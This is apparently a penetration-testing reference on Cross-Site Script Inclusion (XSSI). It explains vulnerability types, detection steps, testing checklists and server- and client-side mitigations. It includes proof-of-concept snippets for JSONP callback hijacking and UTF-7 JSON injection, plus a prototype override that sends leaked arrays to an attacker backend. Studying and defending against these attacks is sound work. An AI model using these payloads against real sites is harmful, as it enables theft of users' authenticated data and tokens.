## 1. Overview

**Cross-Site Script Inclusion (XSSI)** is a vulnerability that exploits the behavior of the HTML `<script>` tag, which is exempt from the Same-Origin Policy (SOP). Unlike most resources that are restricted by SOP, scripts can be included from different domains, allowing attackers to read sensitive data loaded via script tags.

### Key Characteristics

- **Bypass of SOP**: Scripts are exempt from the Same-Origin Policy, allowing cross-domain inclusion
- **Data Exposure**: Attackers can exploit this to read data loaded via the `<script>` tag
- **Impact on Dynamic JavaScript/JSONP**: Particularly relevant for dynamic JavaScript or JSON with Padding (JSONP)
- **Ambient-Authority Information**: Uses "ambient-authority" information like cookies for authentication, which are automatically included in script requests
- **Authentication Token Leakage**: Attackers can trick a user's browser into requesting scripts from servers they control, potentially accessing sensitive information

### Vulnerability Types

1. **Static JavaScript** - Conventional form of XSSI with private information in publicly accessible JavaScript files
2. **Static JavaScript with Authentication** - Requires authentication to access the vulnerable script
3. **Dynamic JavaScript** - JavaScript that dynamically generates content based on user requests
4. **Non-JavaScript** - Vulnerabilities involving non-script files (CSV, JSON) loaded as scripts

## 2. Exploitation Methods

### Regular XSSI (Static JavaScript)

Private information is embedded within a globally accessible JavaScript file. Attackers include the script in malicious content to access sensitive data.

**Detection Steps:**

1. Identify JavaScript files containing sensitive data
2. Use file reading, keyword searches, or regular expressions
3. Check for globally accessible variables containing confidential information

**Exploitation:**

```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script>
  alert(JSON.stringify(confidential_keys[0]))
</script>
```

### Dynamic JavaScript-Based XSSI

Confidential information is dynamically added to scripts in response to authenticated user requests.

**Detection Steps:**

1. Send requests with authentication cookies
2. Send requests without authentication cookies
3. Compare responses to identify differences
4. Use automated tools like [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp extension

**Exploitation (Global Variable):**

If confidential data is in a global variable, exploit using methods similar to Regular XSSI.

**Exploitation (JSONP Callback Hijacking):**

```html
<script>
  var angular = function () {
    return 1
  }
  angular.callbacks = function () {
    return 1
  }
  angular.callbacks._7 = function (leaked) {
    alert(JSON.stringify(leaked))
  }
</script>
<script
  src="https://site.tld/p?jsonp=angular.callbacks._7"
  type="text/javascript"></script>
```

**Alternative JSONP Exploitation:**

```html
<script>
  leak = function (leaked) {
    alert(JSON.stringify(leaked))
  }
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```

### Prototype Tampering

For variables not in the global namespace, exploit JavaScript's prototype chain by overriding built-in functions.

**Exploitation:**

```javascript
Array.prototype.slice = function () {
  // leaks ["secret1", "secret2", "secret3"]
  sendToAttackerBackend(this)
}
```

**Additional Attack Vectors:**

Security researcher [Sebastian Lekies](https://twitter.com/slekies) maintains a comprehensive list of attack [vectors](http://sebastian-lekies.de/leak/).

### Non-Script XSSI

Non-JavaScript files (CSV, JSON) are leaked cross-origin by including them as sources in `<script>` tags.

**Historical Examples:**

- **2006**: Jeremiah Grossman's attack to read complete Google address book
- **2007**: Joe Walker's JSON data leak

**UTF-7 Encoded JSON Exploitation:**

Gareth Heyes described an attack using UTF-7 encoded JSON to escape JSON format and execute scripts (effective in certain browsers).

**Payload:**

```javascript
;[
  {
    friend: "luke",
    email:
      "+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-",
  },
]
```

**Exploitation:**

```html
<script
  src="http://site.tld/json-utf7.json"
  type="text/javascript"
  charset="UTF-7"></script>
```

## 3. Exploitation Checks

### Identification Checklist

- [ ] Identify endpoints serving JavaScript with sensitive data
- [ ] Check if scripts use globally accessible variables
- [ ] Test for dynamic content generation based on authentication
- [ ] Look for JSONP endpoints with controllable callback parameters
- [ ] Verify if non-JavaScript files (CSV, JSON) can be loaded as scripts
- [ ] Test different character encodings (UTF-7, UTF-16)
- [ ] Check if authentication cookies are included in script requests

### Testing Process

1. **Baseline Testing**: Request scripts without authentication and record responses
2. **Authenticated Testing**: Request scripts with valid authentication and compare responses
3. **Callback Parameter Testing**: Test JSONP endpoints with custom callback functions
4. **Prototype Pollution Testing**: Attempt to override built-in JavaScript prototypes
5. **Cross-Origin Testing**: Include target scripts from attacker-controlled domains
6. **Encoding Testing**: Test various character encodings for bypass opportunities

## 4. Higher Impact Scenarios

### Data Exfiltration

- **User Credentials**: Leaking authentication tokens, API keys, or session identifiers
- **Personal Information**: Extracting names, emails, addresses, phone numbers
- **Financial Data**: Accessing account balances, transaction history, credit card details
- **Business Intelligence**: Stealing proprietary algorithms, customer lists, pricing information

### Attack Chains

- **XSSI + CSRF**: Combine with Cross-Site Request Forgery for authenticated actions
- **XSSI + XSS**: Chain with Cross-Site Scripting for full account compromise
- **XSSI + OAuth**: Steal OAuth tokens for third-party service access
- **XSSI + API Abuse**: Extract API keys to abuse rate limits or premium features

### Targeted Attacks

- **Enterprise Applications**: Stealing employee data, internal documentation, or business secrets
- **Healthcare Systems**: Accessing protected health information (PHI)
- **Financial Services**: Extracting customer portfolios, trading algorithms
- **Government Systems**: Leaking classified or sensitive government data

## 5. Mitigations

### Server-Side Protections

**Content-Type Headers:**

- Serve JavaScript files with proper `Content-Type: application/javascript`
- Avoid serving JSON data with JavaScript MIME types
- Use `X-Content-Type-Options: nosniff` header

**Authentication Tokens:**

- Use anti-CSRF tokens in requests for sensitive data
- Implement request origin validation
- Require POST requests with custom headers for sensitive operations

**JSON Protection:**

- Prepend JSON responses with `while(1);` or `for(;;);` to prevent execution as JavaScript
- Wrap JSON in non-executable constructs
- Use proper JSON Content-Type headers

**JSONP Deprecation:**

- Migrate away from JSONP to CORS-based APIs
- If JSONP is required, validate callback parameter names strictly
- Whitelist allowed callback functions

### Client-Side Protections

**Browser Security Features:**

- Implement Content Security Policy (CSP) to restrict script sources
- Use `Fetch Metadata` headers to validate request context
- Enable `Cross-Origin-Resource-Policy` headers

**Modern Alternatives:**

- Use CORS with proper configuration instead of JSONP
- Implement token-based authentication with custom headers
- Use POST requests for sensitive data retrieval

### Code Review Guidelines

- Audit all endpoints serving JavaScript for sensitive data
- Review JSONP implementations for callback parameter validation
- Check for global variables containing confidential information
- Verify authentication requirements for dynamic JavaScript
- Test script inclusion from cross-origin contexts

### Monitoring and Detection

- Log unusual script inclusion patterns
- Monitor for automated scanning tools
- Alert on suspicious callback parameter values
- Track cross-origin requests to sensitive endpoints
